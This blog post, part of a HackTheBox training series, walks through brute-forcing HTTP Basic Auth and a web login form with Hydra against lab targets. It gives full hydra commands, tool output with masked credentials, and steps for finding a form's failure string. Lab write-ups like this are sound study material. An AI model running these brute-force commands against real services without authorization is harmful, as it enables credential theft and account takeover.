---
title: 'HTB - Login Brute Forcing Module - Hydra'
date: '2025-12-13T16:01:00+00:00'
author: Ryan
layout: post
draft: false
categories:
    - penetration-testing
    - infosec
    - hackthebox
---

# HackTheBox Login Brute Force - Hydra

This is part of a multi-part series documenting my process for completing the HackTheBox modules.

Hydra is a fast and flexible login brute-forcing tool that supports numerous protocols. It is widely used in penetration testing to identify weak credentials on various services. Hydra can perform both dictionary and brute-force attacks, making it a versatile choice for credential cracking.

## Basic HTTP Auth Challenge

This one is incredibly simple to crack. Run hydra against the target with the provided username and password list:

```bash
λ hydra (main) $ hydra -l basic-auth-user -P ./2023-200_most_used_passwords.txt 94.237.55.124 -s 30755 http-get
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-13 20:53:55
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking http-get://94.237.55.124:30755/
[30755][http-get] host: 94.237.55.124   login: basic-auth-user   password: ************
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-13 20:53:57
λ hydra (main) $
```

Then open your browser to the target IP and port, and enter the discovered credentials. You should be granted access and will see the flag. 


## Login Forms Challenge

This module is a bit more complex, in that it covers cracking login forms. Hydra can handle this as well, but it requires a bit more setup.

Hydra's http-post-form module is specifically designed to target login forms. You must provide the success and/or failure conditions to let Hydra know when a login attempt is successful. You do this by specifying the form parameters and the expected response.

Example:
```bash
hydra -l <username> -P <password_list> <target_ip> -s <port> http-post-form "/login:username=^USER^&password=^PASS^:F=login failed"
```

In the example above, "login failed" is the failure condition. Hydra expects to see this string in the response when a login attempt fails. If it doesn't see this string, it assumes the login was successful. To determine what the failure/success condition should be, you can use the browser developer tools to inspect the network traffic while you interact with the login form. You could also use a proxy like Burp suite to capture the request and response.

Anyway, on to the challenge. First, start the target. HTB will provide you with a public IP address and port to test against. In your browser, open the dev tools and go to the network tab. Then, enter any random username and password into the login form and submit it. Look for the request in the network tab. Click on it, and then go to the "Payload" section, where you'll see the parameters sent with the request. Take note of the parameter names. Then go to the "Response" section to see what the server returned. Look for a string that indicates a failed login attempt. This will be your failure condition. In this case, the response contains the string "Invalid credentials".

HTB provides you with a github link to a username list and password list. Download both. 

Fire up hydra with the appropriate parameters:
```bash
λ hydra (main) $ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.56.175 -s 51800  http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-14 20:40:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-post-form://94.237.56.175:51800/:username=^USER^&password=^PASS^:F=Invalid credentials
[51800][http-post-form] host: 94.237.56.175   login: ******   password: *********
```

It doesn't take long for hydra to find the valid credentials. Once it does, open your browser to the target IP and port, enter the discovered credentials, and you should be granted access and see the flag.
